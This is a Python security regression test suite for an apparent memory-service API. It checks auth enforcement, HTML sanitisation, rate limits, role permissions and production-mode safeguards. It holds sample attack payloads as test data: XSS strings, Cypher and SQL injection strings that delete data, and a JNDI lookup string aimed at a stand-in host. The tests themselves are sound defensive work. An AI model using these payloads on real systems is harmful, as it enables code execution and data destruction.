"""
tests/test_security_audit.py — Security regression tests.

Pen test 2026-04-01 findings baked into automated tests.
These run on every PR to prevent security regressions for all clients.

Tests cover:
  - Auth enforcement on sensitive GET endpoints
  - Invalid API key rejection (no silent downgrade)
  - HTML/XSS sanitization at ingest boundary
  - Cypher injection resilience
  - Payload size limits
  - Rate limiting activation
  - Force-auth path completeness
"""
import os
import re
import pytest
from unittest.mock import MagicMock, patch


# ── HTML Sanitization (stored XSS prevention) ──────────────────────────────

class TestHTMLSanitization:
    """Pen test finding: <script> tags stored raw if approved through review queue."""

    def test_script_tags_stripped(self):
        from collab_memory.sanitization import sanitize
        r = sanitize("<script>alert(1)</script>Normal text")
        # The sanitized text should not contain script tags
        assert r.is_safe or r.flagged_for_review  # may be flagged but not dangerous
        # Even if flagged, the underlying text should have been stripped
        from collab_memory.sanitization import _strip_html
        clean = _strip_html("<script>alert('xss')</script>Hello")
        assert "<script>" not in clean
        assert "alert" not in clean
        assert "Hello" in clean

    def test_nested_script_stripped(self):
        from collab_memory.sanitization import _strip_html
        clean = _strip_html("<script>var x=1;</script><div>safe</div>")
        assert "<script>" not in clean
        assert "<div>" not in clean
        assert "safe" in clean

    def test_img_onerror_stripped(self):
        from collab_memory.sanitization import _strip_html
        clean = _strip_html('<img src=x onerror="alert(1)">')
        assert "<img" not in clean

    def test_event_handler_tags_stripped(self):
        from collab_memory.sanitization import _strip_html
        clean = _strip_html('<div onmouseover="alert(1)">hover</div>')
        assert "<div" not in clean
        assert "hover" in clean

    def test_clean_text_unchanged(self):
        from collab_memory.sanitization import _strip_html
        text = "This is normal text with no HTML"
        assert _strip_html(text) == text

    def test_markdown_preserved(self):
        from collab_memory.sanitization import _strip_html
        text = "# Heading\n- list item\n**bold** `code`"
        assert _strip_html(text) == text


# ── Force-Auth Path Coverage ────────────────────────────────────────────────

class TestForceAuthPaths:
    """Pen test finding: /memory/context and /graph/debug leaked data without auth."""

    def _get_force_auth_paths(self):
        """Import the actual _FORCE_AUTH_PATHS from server module."""
        # We can't easily import the full server (it starts FastAPI),
        # so we verify the critical paths are in the set by reading the source.
        import importlib.util
        server_path = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "api", "server.py"
        )
        with open(server_path) as f:
            source = f.read()
        return source

    def test_memory_context_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/memory/context"' in source, "/memory/context must be in _FORCE_AUTH_PATHS"

    def test_graph_debug_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/graph/debug"' in source, "/graph/debug must be in _FORCE_AUTH_PATHS"

    def test_memory_search_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/memory/search"' in source, "/memory/search must be in _FORCE_AUTH_PATHS"

    def test_security_audit_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/security/audit"' in source, "/security/audit must be in _FORCE_AUTH_PATHS"

    def test_graph_export_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/graph/export"' in source, "/graph/export must be in _FORCE_AUTH_PATHS"

    def test_ops_status_requires_auth(self):
        source = self._get_force_auth_paths()
        assert '"/ops/status"' in source, "/ops/status must be in _FORCE_AUTH_PATHS"

    def test_audit_endpoints_require_auth(self):
        source = self._get_force_auth_paths()
        assert '"/audit/context"' in source, "/audit/context must be in _FORCE_AUTH_PATHS"


# ── Cypher Injection Resilience ─────────────────────────────────────────────

class TestCypherInjection:
    """Verify injection payloads are treated as literal text, not executed."""

    def test_sanitize_cypher_injection(self):
        from collab_memory.sanitization import sanitize
        payloads = [
            "') RETURN n //",
            "test'] MATCH (n) DETACH DELETE n //",
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "${jndi:ldap://evil.com/a}",
        ]
        for payload in payloads:
            r = sanitize(payload)
            # These should either pass (treated as literal text) or be flagged
            # They should NEVER cause an error or be executed
            assert isinstance(r.is_safe, bool), f"Sanitize failed on: {payload!r}"


# ── Rate Limiting Configuration ─────────────────────────────────────────────

class TestRateLimitConfig:
    """Verify rate limiting module is properly configured."""

    def test_rate_limit_module_exists(self):
        from collab_memory.rate_limit import limiter, ENABLED, LIMITS
        assert limiter is not None
        assert isinstance(LIMITS, dict)

    def test_rate_limit_tiers_defined(self):
        from collab_memory.rate_limit import LIMITS
        assert "memory" in LIMITS
        assert "proxy" in LIMITS
        assert "ops" in LIMITS
        assert "default" in LIMITS

    def test_payload_cap_configured(self):
        from collab_memory.rate_limit import MAX_BODY_BYTES
        # Default 1MB
        assert MAX_BODY_BYTES > 0
        assert MAX_BODY_BYTES <= 10 * 1_048_576  # sanity: not more than 10MB

    def test_key_resolution_prefers_api_key(self):
        from collab_memory.rate_limit import _key_from_api_key_or_ip
        mock_request = MagicMock()
        mock_request.headers = {"X-API-Key": "test-key-123"}
        key = _key_from_api_key_or_ip(mock_request)
        assert key.startswith("key:")

    def test_key_resolution_falls_back_to_ip(self):
        from collab_memory.rate_limit import _key_from_api_key_or_ip
        mock_request = MagicMock()
        mock_request.headers = {}
        mock_request.client.host = "192.168.1.1"
        key = _key_from_api_key_or_ip(mock_request)
        assert key.startswith("ip:")


# ── ABAC Role Enforcement ──────────────────────────────────────────────────

class TestABACSecurityBoundary:
    """Verify ABAC roles enforce write restrictions."""

    def test_reader_cannot_write(self):
        """Reader role must not have can_write."""
        from collab_memory.abac import AgentContext
        reader = AgentContext(role="reader", agent_id="test")
        assert not reader.can_write

    def test_external_cannot_write(self):
        from collab_memory.abac import AgentContext
        ext = AgentContext(role="external", agent_id="test")
        assert not ext.can_write

    def test_admin_can_write(self):
        from collab_memory.abac import AgentContext
        admin = AgentContext(role="admin", agent_id="test")
        assert admin.can_write

    def test_contributor_can_write(self):
        from collab_memory.abac import AgentContext
        contrib = AgentContext(role="contributor", agent_id="test")
        assert contrib.can_write


# ── Firewall Layer Integrity ────────────────────────────────────────────────

class TestFirewallLayers:
    """Ensure all 5 firewall layers are present and configured."""

    def test_semantic_threshold_set(self):
        from collab_memory.firewall import SEMANTIC_THRESHOLD
        assert 0 < SEMANTIC_THRESHOLD < 1

    def test_confidence_floor_set(self):
        from collab_memory.firewall import CONFIDENCE_FLOOR
        assert 0 < CONFIDENCE_FLOOR < 1

    def test_firewall_actions_defined(self):
        from collab_memory.firewall import FirewallAction
        assert hasattr(FirewallAction, "PASS")
        assert hasattr(FirewallAction, "QUEUE")
        assert hasattr(FirewallAction, "REJECT")

    def test_injection_seeds_populated(self):
        from collab_memory.firewall import _INJECTION_SEEDS
        assert len(_INJECTION_SEEDS) >= 4, "Need at least 4 injection seed vectors"


# ── Input Validation ────────────────────────────────────────────────────────

class TestInputValidation:
    """Verify edge cases in input handling."""

    def test_empty_input_safe(self):
        from collab_memory.sanitization import sanitize
        assert sanitize("").is_safe
        assert sanitize("   ").is_safe

    def test_very_long_input_handled(self):
        """Large inputs should not crash the sanitizer."""
        from collab_memory.sanitization import sanitize
        big = "A" * 100_000
        r = sanitize(big)
        assert isinstance(r.is_safe, bool)

    def test_unicode_handled(self):
        from collab_memory.sanitization import sanitize
        r = sanitize("日本語テスト 🤖 émojis and ñ")
        assert r.is_safe

    def test_null_bytes_handled(self):
        from collab_memory.sanitization import sanitize
        r = sanitize("test\x00null\x00bytes")
        assert isinstance(r.is_safe, bool)


# ── Client Deployment Safety ────────────────────────────────────────────────

class TestClientDeploymentSafety:
    """Ensure every client instance of Semantic Memory is secure by default.

    These tests verify that production mode disables all dev bypasses,
    so a client who deploys without reading the docs can't accidentally
    run an insecure instance.
    """

    def test_production_env_detection_in_server(self):
        """server.py must detect COLLAB_ENV=production."""
        server_path = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "api", "server.py"
        )
        with open(server_path) as f:
            source = f.read()
        assert "COLLAB_ENV" in source, "Server must check COLLAB_ENV"
        assert "_IS_PRODUCTION" in source, "Server must define _IS_PRODUCTION flag"

    def test_production_blocks_writes_without_api_key(self):
        """In production, missing COLLAB_API_KEY must block writes (not grant admin)."""
        server_path = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "api", "server.py"
        )
        with open(server_path) as f:
            source = f.read()
        # The middleware must check _IS_PRODUCTION before granting admin bypass
        assert "_IS_PRODUCTION" in source
        assert "Server Misconfigured" in source, (
            "Production mode without COLLAB_API_KEY must return a clear error"
        )

    def test_jwt_bypass_blocked_in_production(self):
        """JWT bypass mode must not work in production."""
        from collab_memory.auth.jwt_provider import JWTAuthProvider as JWTProvider
        provider = JWTProvider()
        # Simulate production: _is_production=True, no secret
        provider._is_production = True
        provider._secret = ""
        with pytest.raises(ValueError, match="JWT_SECRET is not set"):
            provider._bypass_response("test@example.com", "signup")

    def test_jwt_bypass_works_in_dev(self):
        """JWT bypass should still work in development."""
        from collab_memory.auth.jwt_provider import JWTAuthProvider as JWTProvider
        provider = JWTProvider()
        provider._is_production = False
        provider._secret = ""
        result = provider._bypass_response("test@example.com", "signup")
        assert result["_bypass"] is True

    def test_self_hosted_env_template_has_production(self):
        """The .env.self-hosted template must default to COLLAB_ENV=production."""
        env_path = os.path.join(
            os.path.dirname(__file__), "..", ".env.self-hosted"
        )
        with open(env_path) as f:
            content = f.read()
        assert "COLLAB_ENV=production" in content, (
            ".env.self-hosted must set COLLAB_ENV=production so client deploys are secure by default"
        )

    def test_version_from_pyproject(self):
        """API version must use collab_memory._version (single source of truth)."""
        server_path = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "api", "server.py"
        )
        with open(server_path) as f:
            source = f.read()
        assert "from .._version import __version__ as _VERSION" in source, (
            "server.py must import _VERSION from collab_memory._version"
        )
        assert 'version="0.3.0"' not in source, "Hardcoded 0.3.0 version must be removed"
        vpath = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "_version.py"
        )
        assert os.path.isfile(vpath), "src/collab_memory/_version.py must exist"

    def test_inbox_route_before_agent_id(self):
        """Inbox routes must be registered before /agent/{agent_id} catch-all."""
        server_path = os.path.join(
            os.path.dirname(__file__), "..", "src", "collab_memory", "api", "server.py"
        )
        with open(server_path) as f:
            source = f.read()
        inbox_pos = source.find('"/agent/inbox"')
        agent_id_pos = source.find('"/agent/{agent_id}"')
        assert inbox_pos < agent_id_pos, (
            "/agent/inbox must be registered before /agent/{agent_id} to prevent route collision"
        )
